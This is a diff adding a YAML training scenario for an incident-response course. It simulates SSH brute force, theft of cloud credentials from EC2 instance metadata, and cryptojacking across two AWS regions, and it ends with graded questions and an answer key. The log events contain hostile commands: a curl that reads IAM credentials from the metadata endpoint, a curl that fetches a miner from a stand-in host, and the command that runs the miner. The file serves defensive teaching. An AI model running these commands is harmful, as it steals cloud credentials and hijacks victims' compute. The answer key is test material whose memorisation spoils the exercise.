@@ -1,0 +1,523 @@
+# ForgeIncident scenario file
+# =============================================================================
+# INTERMEDIATE TIER (curriculum I5). The first scenario where the attacker
+# steals nothing portable at all. Contrast this carefully with A1 and A2:
+#
+#   - A1 (GCP key compromise) and A2 (stolen dev credentials to AWS) both
+#     hinge on a STATIC credential -- a JSON key file, an access key in
+#     ~/.aws/credentials -- that the attacker can carry away and use from
+#     anywhere. This scenario's credential is a temporary token issued by
+#     the EC2 Instance Metadata Service, usable only from the instance that
+#     requested it. The attacker never leaves the box: every single AWS
+#     API call in this incident originates from the compromised instance's
+#     OWN network identity, not an external one. There is no "attacker IP"
+#     anywhere in the aws_cloudtrail evidence -- only in the Linux log,
+#     and only for the initial SSH burst. Correlating the two requires
+#     recognizing that absence, not matching a shared value.
+#   - A2's discovery was an S3 EGRESS cost spike (data leaving). This one's
+#     is a COMPUTE spend spike (new GPU instances running) -- a different
+#     AWS Cost Anomaly Detection category, and arguably the more common
+#     real-world path to discovering cryptojacking specifically.
+#   - The correlating signal between a legitimate and a malicious call to
+#     the exact same API (RunInstances) is IDENTITY and CONTEXT --
+#     service-linked caller vs. a real IP, ordinary instance type vs. GPU,
+#     one region vs. two -- not a shared IOC. Same structural pattern as
+#     I3's two inbox rules and A7's two device registrations, applied to
+#     cloud infrastructure instead of identity.
+#
+# Two compounding misconfigurations, not one: a service account with a
+# weak, guessable SSH password (rather than key-only auth), AND
+# unnecessary passwordless sudo on that same account. Either alone limits
+# the blast radius; together they hand the attacker root-equivalent shell
+# access from a brute-forced password alone.
+# =============================================================================
+
+scenario_id: cryptomining-cloud-compromise-01
+title: "SSH Brute Force to Cloud-Scale Cryptojacking"
+
+description: >
+  Lucid Stream Media runs a fleet of EC2 workers for video-transcoding
+  analytics. One worker, LSM-WRK-07, still has SSH password authentication
+  enabled for its "deploy" service account -- a leftover from an early
+  setup that automation never migrated off key-only auth. The account also
+  has unnecessary passwordless sudo, a second, independent misconfiguration
+  that turns out to matter just as much as the first.
+
+  An external actor brute-forces the account's weak password over a burst
+  of 63 attempts and succeeds. From an ordinary shell, they check what
+  they can run (unrestricted sudo, as it turns out), then query the EC2
+  Instance Metadata Service directly from the box -- an unauthenticated,
+  local request that returns temporary AWS credentials for whatever IAM
+  role is attached to the instance. No static key is stolen; the
+  credentials the attacker obtains only work from this instance.
+
+  They use those credentials two ways: first locally, downloading and
+  running a cryptomining binary directly on LSM-WRK-07, and then at cloud
+  scale, calling RunInstances to launch GPU-class instances in two
+  separate AWS regions purely for additional mining capacity -- spreading
+  the launches across regions to keep any single region's spend under a
+  budget alarm's threshold.
+
+  Every AWS API call the attacker makes originates from LSM-WRK-07's own
+  public IP, because the credentials never leave the instance. The
+  external IP used for the original SSH brute force never appears
+  anywhere in the AWS-side evidence.
+
+  Nothing internal to Lucid catches this. Six days later, AWS Cost
+  Anomaly Detection flags an aggregate compute-spend spike across both
+  regions combined -- the region-splitting delayed detection but did not
+  prevent it, since the anomaly detection evaluates total account spend,
+  not spend per region.
+
+student_briefing: >
+  Lucid Stream Media's finance team received an AWS Cost Anomaly
+  Detection alert for a sharp, sustained increase in EC2 compute spend
+  across two regions, well outside normal patterns for the video-
+  transcoding worker fleet.
+
+  You have the Linux auth/syslog export from LSM-WRK-07 (one of the
+  worker instances) and an AWS CloudTrail export for the account, both
+  covering the relevant period.
+
+  Determine whether this is a genuine compromise, and if so: how initial
+  access was obtained, what the attacker did once they had a shell, how
+  they were able to take actions at the AWS account level without ever
+  having AWS credentials of their own, and the full scope of unauthorized
+  cloud resources created. Be specific about what evidence does and does
+  not place the attacker's real-world origin IP anywhere in the AWS logs.
+
+difficulty: intermediate
+version: "1.0"
+seed: 20260210
+
+organization:
+  name: Lucid Stream Media
+  domain: lucidstreammedia.example
+  industry: Media Technology / Video Analytics
+  timezone: UTC
+  gcp_project_id: "778812339901"  # reused generically as the AWS account ID; see aws_cloudtrail emitter
+
+mitre_tactics:
+  - Initial Access
+  - Credential Access
+  - Discovery
+  - Command and Control
+  - Impact
+
+learning_objectives:
+  - Recognize an SSH brute-force burst in a Linux auth log and distinguish it from a single failed login
+  - Trace credential theft to a compromised host's own attached cloud identity (instance metadata) rather than a stolen static key
+  - Distinguish a legitimate, service-initiated cloud resource launch from an attacker-initiated one when both are the identical API call
+  - Recognize resource hijacking (cryptomining) as an Impact-stage technique executed both locally and via new cloud compute
+  - Explain why a compromised host's outbound API calls carry ITS OWN network identity, not the original external attacker's IP
+  - Explain why a cost/billing anomaly, not a security tool, is often the first signal for cryptojacking
+
+tags: [cryptomining, cryptojacking, ssh-bruteforce, aws, ec2, imds, resource-hijacking, cloud-cost-anomaly, linux, intermediate]
+
+start_time: "2026-02-10T03:00:00Z"
+
+actors:
+  compromised_account:
+    username: deploy
+    email: deploy@lucidstreammedia.example
+    display_name: Deploy Service Account
+    role_title: CI/CD Automation Account
+    is_privileged: false
+  ops_admin:
+    username: rkim
+    email: rkim@lucidstreammedia.example
+    display_name: Rachel Kim
+    department: Platform Engineering
+    role_title: Site Reliability Engineer
+    employee_id: LSM-4402
+  worker_role:
+    # The IAM role attached to LSM-WRK-07 itself. Never a human, and the
+    # only identity CloudTrail can ever attribute the malicious RunInstances
+    # calls to -- there is no way for CloudTrail to know a person other than
+    # the instance's own workload is behind these calls.
+    username: lucid-worker-role
+    email: lucid-worker-role@lucidstreammedia.amazonaws.com
+    display_name: "EC2 Instance Role (lucid-worker-role)"
+    is_privileged: true
+  autoscaler_role:
+    username: lucid-autoscaler
+    email: lucid-autoscaler@lucidstreammedia.amazonaws.com
+    display_name: "Auto Scaling Service-Linked Role"
+    is_privileged: true
+  attacker:
+    # Present for instructor context only. Never referenced by any event --
+    # neither the Linux auth log nor CloudTrail can identify the person
+    # behind either the SSH burst or the cloud activity; both only ever
+    # record the credential/identity used, matching the convention
+    # established in every other cloud- or identity-driven scenario in
+    # this catalog.
+    username: unknown
+    email: unknown@unattributed.example
+    display_name: Unattributed External Actor
+    is_compromised: true
+
+hosts:
+  worker-instance:
+    hostname: LSM-WRK-07
+    ip_address: 10.30.6.14
+    host_type: server
+    os: linux
+    os_version: "Ubuntu 22.04 LTS"
+
+timeline:
+  # ---- Benign baseline -------------------------------------------------
+  - id: benign-admin-signin
+    at: "+0m"
+    event_type: account_login_success
+    log_sources: [linux]
+    severity: info
+    actor: ops_admin
+    host: worker-instance
+    description: >
+      BENIGN. Rachel's routine SSH login for a scheduled maintenance
+      check, from the office VPN egress. Baseline for legitimate access
+      to this box.
+    extra:
+      source_ip: "198.51.100.90"
+
+  - id: benign-legit-autoscale
+    at: "+14m"
+    event_type: cloud_resource_created
+    log_sources: [aws_cloudtrail]
+    severity: info
+    actor: autoscaler_role
+    description: >
+      BENIGN. Lucid's Auto Scaling Group launches one additional
+      t3.medium worker to handle a routine traffic bump -- ordinary
+      capacity management. Note sourceIPAddress: AWS's own Auto Scaling
+      service made this call on the group's behalf, not a human or a
+      host. This is what every legitimate autoscaling launch looks like
+      in CloudTrail, and it is the baseline the malicious launches later
+      will conspicuously not match.
+    cloud:
+      method_name: "RunInstances"
+      service_name: "ec2.amazonaws.com"
+      resource_name: "instanceType=t3.medium;minCount=1;maxCount=1;imageId=ami-0f9e8d7c6b5a41002;launchedBy=lucid-prod-asg"
+      caller_ip: "autoscaling.amazonaws.com"
+      user_agent: "autoscaling.amazonaws.com"
+      status_code: "OK"
+      project_id: "778812339901"
+      region: "us-east-1"
+
+  # ---- Initial access: an ordinary SSH brute force ----------------------
+  - id: ssh-bruteforce
+    at: "+6h20m"
+    event_type: account_login_failure
+    log_sources: [linux]
+    severity: medium
+    actor: compromised_account
+    host: worker-instance
+    description: >
+      63 failed SSH password attempts against the "deploy" account from
+      192.0.2.55 over several minutes. deploy authenticates with a
+      password rather than a key -- a leftover from early setup that
+      automation never migrated off of.
+    mitre:
+      technique_id: T1110
+      technique_name: "Brute Force"
+      tactic: Credential Access
+    extra:
+      attempt_count: 63
+      source_ip: "192.0.2.55"
+
+  - id: ssh-bruteforce-success
+    at: "+6h24m"
+    event_type: account_login_success
+    log_sources: [linux]
+    severity: critical
+    actor: compromised_account
+    host: worker-instance
+    description: >
+      THE COMPROMISE. The 64th attempt succeeds -- deploy's password was
+      weak enough to fall to an unremarkable brute-force burst. From here
+      the attacker has an ordinary shell on LSM-WRK-07. This is the last
+      point anywhere in this incident's evidence where 192.0.2.55
+      appears.
+    mitre:
+      technique_id: T1078
+      technique_name: "Valid Accounts"
+      tactic: Initial Access
+    extra:
+      source_ip: "192.0.2.55"
+
+  # ---- Recon and the pivot to cloud credentials --------------------------
+  - id: recon-whoami
+    at: "+6h26m"
+    event_type: process_created
+    log_sources: [linux]
+    severity: low
+    actor: compromised_account
+    host: worker-instance
+    description: >
+      Basic situational recon: who this account is, and what it can run
+      as. The second misconfiguration surfaces immediately -- deploy has
+      unrestricted, passwordless sudo, which is why every command from
+      here on renders as a sudo invocation.
+    mitre:
+      technique_id: T1033
+      technique_name: "System Owner/User Discovery"
+      tactic: Discovery
+    process:
+      pid: 41822
+      ppid: 41790
+      name: bash
+      command_line: "whoami && id && sudo -l"
+      parent_name: sshd
+
+  - id: imds-credential-theft
+    at: "+6h29m"
+    event_type: process_created
+    log_sources: [linux]
+    severity: critical
+    actor: compromised_account
+    host: worker-instance
+    description: >
+      THE PIVOT. A local, unauthenticated request to the EC2 Instance
+      Metadata Service returns temporary AWS credentials for
+      lucid-worker-role, the IAM role attached to this instance. Unlike
+      A1's leaked service-account key or A2's long-lived AWS access key,
+      nothing static or portable is taken here -- these credentials are
+      scoped to and only usable from this specific instance. The
+      attacker's entire subsequent AWS activity has to originate from
+      LSM-WRK-07 itself, because that is the only place these credentials
+      work.
+    mitre:
+      technique_id: T1552.005
+      technique_name: "Unsecured Credentials: Cloud Instance Metadata API"
+      tactic: Credential Access
+    process:
+      pid: 41855
+      ppid: 41822
+      name: curl
+      command_line: "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/lucid-worker-role"
+      parent_name: bash
+
+  # ---- Local cryptomining ------------------------------------------------
+  - id: mining-binary-download
+    at: "+6h33m"
+    event_type: process_created
+    log_sources: [linux]
+    severity: critical
+    actor: compromised_account
+    host: worker-instance
+    description: >
+      A cryptomining binary is pulled down and extracted into /tmp.
+    mitre:
+      technique_id: T1105
+      technique_name: "Ingress Tool Transfer"
+      tactic: Command and Control
+    process:
+      pid: 41901
+      ppid: 41822
+      name: bash
+      command_line: "curl -s -o /tmp/.sysupd.tar.gz https://cdn-mirror-assets.example/pkg/update.tar.gz && tar -xzf /tmp/.sysupd.tar.gz -C /tmp"
+      parent_name: bash
+
+  - id: mining-execution
+    at: "+6h35m"
+    event_type: process_created
+    log_sources: [linux]
+    severity: critical
+    actor: compromised_account
+    host: worker-instance
+    description: >
+      The extracted binary is launched, pointed at a mining pool. This is
+      the local half of the resource-hijacking impact -- the cloud-scale
+      half follows via RunInstances below, using the same stolen
+      instance-role credentials.
+    mitre:
+      technique_id: T1496
+      technique_name: "Resource Hijacking"
+      tactic: Impact
+    process:
+      pid: 41930
+      ppid: 41901
+      name: .sysupd
+      command_line: "/tmp/.sysupd --donate-level=0 -o stratum+tcp://pool.minexmr-relay.example:4444 -u 46xR2q8f...redacted --background"
+      parent_name: bash
+      sha256: "c8f1a3e6b9d20d47f5a8c1e2b4d6f8a0c2e4b6d8f0a2c4e6b8d0f2a4c6e8b0d2"
+
+  # ---- Cloud-scale cryptomining: same technique, two regions -------------
+  - id: malicious-runinstances-1
+    at: "+6h41m"
+    event_type: cloud_resource_created
+    log_sources: [aws_cloudtrail]
+    severity: critical
+    actor: worker_role
+    description: >
+      Using the stolen instance-role credentials, the attacker calls
+      RunInstances directly from LSM-WRK-07 to launch two GPU-class
+      g4dn.2xlarge instances -- compute far beyond anything Lucid's
+      transcoding workload needs. sourceIPAddress is LSM-WRK-07's own
+      public IP, not the 192.0.2.55 seen in the SSH log: the credentials
+      never left the box, so neither does the network identity behind
+      their use.
+    mitre:
+      technique_id: T1496
+      technique_name: "Resource Hijacking"
+      tactic: Impact
+    cloud:
+      method_name: "RunInstances"
+      service_name: "ec2.amazonaws.com"
+      resource_name: "instanceType=g4dn.2xlarge;minCount=2;maxCount=2;imageId=ami-0a1b2c3d4e5f60099"
+      caller_ip: "203.0.113.240"
+      user_agent: "aws-cli/2.15.0 Python/3.11.6 Linux/5.15.0"
+      status_code: "OK"
+      project_id: "778812339901"
+      region: "us-east-1"
+
+  - id: benign-legit-autoscale-2
+    at: "+7h50m"
+    event_type: cloud_resource_created
+    log_sources: [aws_cloudtrail]
+    severity: info
+    actor: autoscaler_role
+    description: >
+      BENIGN. A second, ordinary autoscaling launch, interleaved with the
+      attack -- included so flagging every RunInstances call in this
+      window, rather than the specific ones with a real IP and a GPU
+      instance type, counts as a false positive.
+    cloud:
+      method_name: "RunInstances"
+      service_name: "ec2.amazonaws.com"
+      resource_name: "instanceType=t3.medium;minCount=1;maxCount=1;imageId=ami-0f9e8d7c6b5a41002;launchedBy=lucid-prod-asg"
+      caller_ip: "autoscaling.amazonaws.com"
+      user_agent: "autoscaling.amazonaws.com"
+      status_code: "OK"
+      project_id: "778812339901"
+      region: "us-east-1"
+
+  - id: malicious-runinstances-2
+    at: "+9h10m"
+    event_type: cloud_resource_created
+    log_sources: [aws_cloudtrail]
+    severity: critical
+    actor: worker_role
+    description: >
+      A second, larger launch -- three more g4dn.2xlarge instances -- in
+      us-west-2 rather than us-east-1. Splitting the fleet across regions
+      keeps either single region's spend under a budget alarm scoped
+      per-region, though it does not evade an account-wide anomaly
+      detector evaluating total spend. Same caller IP, same role, same
+      technique as the first launch; only the region changed.
+    mitre:
+      technique_id: T1496
+      technique_name: "Resource Hijacking"
+      tactic: Impact
+    cloud:
+      method_name: "RunInstances"
+      service_name: "ec2.amazonaws.com"
+      resource_name: "instanceType=g4dn.2xlarge;minCount=3;maxCount=3;imageId=ami-0c4d5e6f7a8b90123"
+      caller_ip: "203.0.113.240"
+      user_agent: "aws-cli/2.15.0 Python/3.11.6 Linux/5.15.0"
+      status_code: "OK"
+      project_id: "778812339901"
+      region: "us-west-2"
+
+  # ---- Life goes on, then discovery six days later ------------------------
+  - id: benign-admin-signin-2
+    at: "+1d"
+    event_type: account_login_success
+    log_sources: [linux]
+    severity: info
+    actor: ops_admin
+    host: worker-instance
+    description: >
+      BENIGN. Rachel logs in again the next day, unaware anything is
+      wrong, from her usual IP.
+    extra:
+      source_ip: "198.51.100.90"
+
+  - id: alert-triggered
+    at: "+6d"
+    event_type: alert_triggered
+    log_sources: [aws_cloudtrail]
+    severity: critical
+    description: >
+      Six days after initial access, AWS Cost Anomaly Detection flags an
+      aggregate compute-spend spike across us-east-1 and us-west-2
+      combined -- the account-wide view the region-splitting could not
+      evade. Nothing security-specific caught this; the finance guardrail
+      did, and only because it evaluates total spend rather than any
+      single region in isolation.
+    mitre:
+      technique_id: T1496
+      technique_name: "Resource Hijacking"
+      tactic: Impact
+
+answer_key:
+  - id: q1
+    question: "How did the attacker obtain initial access, and what SECOND misconfiguration made it far worse than the first?"
+    answer: >
+      63 failed SSH attempts against the "deploy" account's weak
+      password from 192.0.2.55, then a success on the 64th. The
+      compounding second flaw: deploy also had unrestricted, passwordless
+      sudo -- a service account with a weak password alone would have
+      limited an attacker to that account's own scope; combined with
+      unrestricted sudo, one weak password bought root-equivalent access
+      outright.
+    related_event_ids: [ssh-bruteforce, ssh-bruteforce-success, recon-whoami]
+    points: 4
+
+  - id: q2
+    question: "The attacker never had an AWS access key of their own. How did they take actions at the AWS account level at all?"
+    answer: >
+      The EC2 Instance Metadata Service, queried locally from the
+      compromised shell, hands back temporary credentials for whatever
+      IAM role is attached to the instance -- lucid-worker-role in this
+      case. No static key exists to find or steal; the attacker used the
+      instance's own identity.
+    related_event_ids: [imds-credential-theft]
+    points: 4
+
+  - id: q3
+    question: "Why does 192.0.2.55, the SSH brute-force IP, never appear anywhere in the CloudTrail evidence?"
+    answer: >
+      Because the stolen credentials are scoped to the instance that
+      issued them and cannot be used from anywhere else. Every subsequent
+      AWS API call had to originate from LSM-WRK-07 itself, so
+      CloudTrail's sourceIPAddress shows the instance's own public IP
+      (203.0.113.240), not the attacker's real-world origin. Looking for
+      192.0.2.55 in the AWS logs is a dead end by design, not a gap in
+      the evidence.
+    related_event_ids: [ssh-bruteforce-success, malicious-runinstances-1]
+    hint: "What do temporary, instance-scoped credentials mean for where API calls can physically originate?"
+    points: 4
+
+  - id: q4
+    question: "CloudTrail shows four RunInstances calls in this window. How do you tell the two malicious ones from the two legitimate ones?"
+    answer: >
+      The legitimate calls show sourceIPAddress as autoscaling.amazonaws.com
+      -- AWS's own service, not a host -- and launch an ordinary
+      t3.medium. The malicious calls show an actual IP (203.0.113.240),
+      launch GPU-class g4dn.2xlarge instances the transcoding workload has
+      no use for, and are split across two regions rather than staying in
+      the account's normal us-east-1.
+    related_event_ids: [benign-legit-autoscale, malicious-runinstances-1, benign-legit-autoscale-2, malicious-runinstances-2]
+    points: 4
+
+  - id: q5
+    question: "Why did the attacker launch instances in two different regions instead of one larger batch?"
+    answer: >
+      To keep either single region's compute spend under a budget alarm
+      scoped per-region. It worked for that purpose, but not against
+      Lucid's AWS Cost Anomaly Detection, which evaluates spend across
+      the whole account rather than one region at a time -- which is
+      ultimately what caught this.
+    related_event_ids: [malicious-runinstances-1, malicious-runinstances-2, alert-triggered]
+    points: 3
+
+  - id: q6
+    question: "What is the full scope of unauthorized compute this incident created, both locally and in the cloud?"
+    answer: >
+      One cryptomining process running directly on LSM-WRK-07, plus five
+      attacker-launched GPU instances total (two in us-east-1, three in
+      us-west-2) -- all of it billed to Lucid's own AWS account for the
+      full six days it ran undetected.
+    related_event_ids: [mining-execution, malicious-runinstances-1, malicious-runinstances-2]
+    points: 3
